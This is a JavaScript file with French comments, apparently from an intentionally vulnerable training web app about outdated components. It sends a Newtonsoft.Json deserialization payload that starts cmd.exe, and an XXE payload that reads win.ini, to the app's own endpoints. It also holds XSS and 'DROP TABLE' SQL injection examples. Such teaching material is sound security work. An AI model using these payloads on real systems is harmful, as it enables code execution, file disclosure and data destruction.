// vulnerable-components.js - Gestion spécifique pour Vulnerable and Outdated Components

(function () {
    'use strict';

    // Initialisation
    document.addEventListener('DOMContentLoaded', function () {
        initializeVulnerableComponents();
    });

    function initializeVulnerableComponents() {
        // Gestionnaire pour le changement de type d'attaque
        const attackTypeSelect = document.getElementById('attackType');
        if (attackTypeSelect) {
            attackTypeSelect.addEventListener('change', handleAttackTypeChange);
            // Déclencher l'événement si une valeur est déjà sélectionnée
            if (attackTypeSelect.value) {
                setTimeout(() => handleAttackTypeChange(), 100);
            }
        }

        // Gestionnaires pour les tests réels
        initializeRCETest();
        initializeXXETest();
        initializeTabNavigation();

        // Ajouter à l'historique si nous avons des résultats
        if (window.vulnerableComponentsData && window.vulnerableComponentsData.hasResults) {
            addToHistory(
                window.vulnerableComponentsData.attackType,
                window.vulnerableComponentsData.payload,
                true
            );
        }

        // Initialiser les tooltips
        initializeTooltips();

        // Vérifier les composants vulnérables au chargement
        checkVulnerableComponents();
    }

    function handleAttackTypeChange() {
        const attackTypeSelect = document.getElementById('attackType');
        const attackType = attackTypeSelect.value;
        const payloadExample = document.getElementById('payloadExample');
        const payloadExampleContent = document.getElementById('payloadExampleContent');
        const payloadInput = document.getElementById('payload');

        if (!attackType) {
            payloadExample.style.display = 'none';
            return;
        }

        // Récupérer depuis les attributs data de l'option sélectionnée
        const selectedOption = attackTypeSelect.options[attackTypeSelect.selectedIndex];
        const payloadExampleFromData = selectedOption.getAttribute('data-payload-example');

        if (payloadExampleFromData) {
            payloadExampleContent.textContent = payloadExampleFromData;
            payloadExample.style.display = 'block';
            updateContextualHelp(attackType, payloadInput);
            return;
        }

        // Récupérer depuis les données JSON (fallback)
        const attackInfosData = document.getElementById('attackInfosData');
        if (attackInfosData) {
            try {
                const attackInfos = JSON.parse(attackInfosData.textContent);
                const attackInfo = attackInfos[attackType];

                if (attackInfo) {
                    const payloadExampleText = attackInfo.payloadExample || attackInfo.PayloadExample;

                    if (payloadExampleText) {
                        payloadExampleContent.textContent = payloadExampleText;
                        payloadExample.style.display = 'block';
                        updateContextualHelp(attackType, payloadInput);
                    }
                }
            } catch (e) {
                console.error('Erreur lors du parsing des données d\'attaque:', e);
            }
        }
    }

    function updateContextualHelp(attackType, payloadInput) {
        // Ajouter des placeholders contextuels
        const placeholders = {
            'newtonsoft-rce': 'JSON avec $type pour RCE',
            'log4net-xxe': 'XML avec DTD pour XXE',
            'jquery-xss': '?userInput=<script>alert("XSS")</script>',
            'bootstrap-xss': '?tooltip=<script>alert("XSS")</script>',
            'sqlclient-injection': '?query=SELECT * FROM Users; DROP TABLE Users--'
        };

        if (placeholders[attackType]) {
            payloadInput.placeholder = placeholders[attackType];
        }

        // Mettre en évidence les composants correspondants
        highlightVulnerableComponent(attackType);
    }

    function initializeRCETest() {
        const rceButton = document.querySelector('.test-rce');
        if (rceButton) {
            rceButton.addEventListener('click', function () {
                const rcePayload = {
                    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "MethodName": "Start",
                    "MethodParameters": {
                        "$type": "System.Collections.ArrayList",
                        "$values": ["cmd.exe", "/c calc"]
                    },
                    "ObjectInstance": { "$type": "System.Diagnostics.Process" }
                };

                showNotification('danger', 'Envoi du payload RCE (Newtonsoft.Json 9.0.1)...');

                fetch('/VulnerableComponents/DeserializeJson', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(rcePayload)
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            showNotification('danger', 'CVE-2018-1000210 exploité! TypeNameHandling.All permet RCE!');
                            addToHistory('newtonsoft-rce', 'Remote Code Execution via désérialisation', true);
                            console.error('⚠️ RCE simulé - En production, ceci exécuterait calc.exe!');
                        }
                    })
                    .catch(error => {
                        console.error('Erreur:', error);
                        showNotification('warning', 'Erreur lors du test RCE');
                    });
            });
        }
    }

    function initializeXXETest() {
        const xxeButton = document.querySelector('.test-xxe');
        if (xxeButton) {
            xxeButton.addEventListener('click', function () {
                const xxePayload = `<!DOCTYPE log4net [
                    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
                ]>
                <log4net>
                    <appender name="test">
                        <file value="&xxe;"/>
                    </appender>
                </log4net>`;

                showNotification('warning', 'Envoi du payload XXE (log4net 2.0.8)...');

                fetch('/VulnerableComponents/ConfigureLogging', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/xml',
                    },
                    body: xxePayload
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            showNotification('danger', 'CVE-2018-1285 exploité! XXE via log4net!');
                            addToHistory('log4net-xxe', 'XML External Entity injection', true);
                            console.error('⚠️ XXE simulé - En production, ceci lirait des fichiers système!');
                        }
                    })
                    .catch(error => {
                        console.error('Erreur:', error);
                        showNotification('warning', 'Erreur lors du test XXE');
                    });
            });
        }
    }

    function initializeTabNavigation() {
        // Initialiser les tabs Bootstrap si disponibles
        const tabElements = document.querySelectorAll('a[data-bs-toggle="tab"]');
        tabElements.forEach(tab => {
            tab.addEventListener('click', function (e) {
                e.preventDefault();
                if (typeof bootstrap !== 'undefined' && bootstrap.Tab) {
                    const bsTab = new bootstrap.Tab(this);
                    bsTab.show();
                }
            });
        });
    }

    function highlightVulnerableComponent(componentType) {
        // Animer visuellement le composant sélectionné
        const alerts = document.querySelectorAll('.alert-warning .badge');
        alerts.forEach(badge => {
            badge.classList.remove('pulse-highlight');
        });

        // Ajouter l'animation au composant correspondant
        const componentMap = {
            'newtonsoft-rce': 'Newtonsoft.Json 9.0.1',
            'log4net-xxe': 'log4net 2.0.8',
            'jquery-xss': 'jQuery 2.1.4',
            'bootstrap-xss': 'Bootstrap 3.3.7'
        };

        if (componentMap[componentType]) {
            alerts.forEach(badge => {
                if (badge.textContent.includes(componentMap[componentType])) {
                    badge.classList.add('pulse-highlight');
                }
            });
        }
    }

    function checkVulnerableComponents() {
        // Afficher dans la console les composants vulnérables
        console.group('%c🔍 Vulnerable Components Detection', 'color: red; font-size: 16px; font-weight: bold');
        console.error('❌ CRITICAL: Newtonsoft.Json 9.0.1 - CVE-2018-1000210 (CVSS: 9.8)');
        console.error('   TypeNameHandling.All allows Remote Code Execution');
        console.error('❌ HIGH: log4net 2.0.8 - CVE-2018-1285 (CVSS: 8.1)');
        console.error('   XML External Entity (XXE) injection vulnerability');
        console.error('❌ HIGH: jQuery 2.1.4 - CVE-2015-9251, CVE-2019-11358 (CVSS: 6.1)');
        console.error('   XSS vulnerabilities in $.html() and prototype pollution');
        console.error('❌ HIGH: Bootstrap 3.3.7 - CVE-2018-14041, CVE-2018-14042 (CVSS: 6.1)');
        console.error('   XSS in tooltips and popovers when using data-html="true"');
        console.error('❌ MEDIUM: System.Data.SqlClient 4.4.0 - Multiple vulnerabilities');
        console.warn('');
        console.warn('💡 To detect these vulnerabilities:');
        console.warn('   .NET: dotnet list package --vulnerable');
        console.warn('   npm: npm audit');
        console.warn('   Snyk: snyk test');
        console.groupEnd();
    }

    function showNotification(type, message) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
        alertDiv.style.cssText = 'top: 20px; right: 20px; z-index: 9999; min-width: 300px; max-width: 500px;';
        alertDiv.innerHTML = `
            <i class="fas fa-${type === 'danger' ? 'exclamation-triangle' : type === 'warning' ? 'exclamation-circle' : 'info-circle'}"></i>
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;

        document.body.appendChild(alertDiv);

        // Auto-fermer après 5 secondes
        setTimeout(() => {
            alertDiv.classList.remove('show');
            setTimeout(() => alertDiv.remove(), 150);
        }, 5000);
    }

    function addToHistory(componentType, details, isVulnerable) {
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] ${componentType}: ${details} - ${isVulnerable ? 'VULNERABLE' : 'SAFE'}`);

        // Créer ou mettre à jour l'historique visuel si nécessaire
        updateVisualHistory(componentType, details, isVulnerable, timestamp);
    }

    function updateVisualHistory(componentType, details, isVulnerable, timestamp) {
        // Chercher ou créer un conteneur d'historique
        let historyContainer = document.getElementById('scan-history');
        if (!historyContainer) {
            const alertSection = document.querySelector('.alert-success');
            if (alertSection) {
                historyContainer = document.createElement('div');
                historyContainer.id = 'scan-history';
                historyContainer.className = 'mt-3';
                historyContainer.innerHTML = '<h6><i class="fas fa-history"></i> Historique des tests :</h6><div class="history-items"></div>';
                alertSection.parentNode.insertBefore(historyContainer, alertSection.nextSibling);
            }
        }

        if (historyContainer) {
            const historyItems = historyContainer.querySelector('.history-items');
            const newItem = document.createElement('div');
            newItem.className = `alert alert-${isVulnerable ? 'danger' : 'success'} alert-sm py-2 mb-2`;
            newItem.innerHTML = `
                <small>
                    <i class="fas fa-${isVulnerable ? 'bug' : 'check-circle'}"></i>
                    <strong>${timestamp}</strong> - ${componentType.toUpperCase()}: ${details}
                </small>
            `;
            historyItems.insertBefore(newItem, historyItems.firstChild);

            // Limiter à 5 entrées
            while (historyItems.children.length > 5) {
                historyItems.removeChild(historyItems.lastChild);
            }
        }
    }

    function initializeTooltips() {
        // Ajouter des tooltips informatifs
        const tooltips = [
            { selector: '.badge.bg-danger', title: 'Composant avec vulnérabilités critiques' },
            { selector: '.badge.bg-warning', title: 'Vulnérabilités connues nécessitant une mise à jour' },
            { selector: '.test-rce', title: 'Teste l\'exécution de code à distance via Newtonsoft.Json' },
            { selector: '.test-xxe', title: 'Teste l\'injection XXE via log4net' }
        ];

        tooltips.forEach(tooltip => {
            const elements = document.querySelectorAll(tooltip.selector);
            elements.forEach(el => {
                el.setAttribute('title', tooltip.title);
                el.setAttribute('data-bs-toggle', 'tooltip');
                el.setAttribute('data-bs-placement', 'top');
            });
        });

        // Initialiser Bootstrap tooltips si disponible
        if (typeof bootstrap !== 'undefined' && bootstrap.Tooltip) {
            const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });
        }
    }

    // Exposer certaines fonctions si nécessaire
    window.VulnerableComponents = {
        checkVulnerableComponents: checkVulnerableComponents,
        showNotification: showNotification,
        addToHistory: addToHistory
    };

})();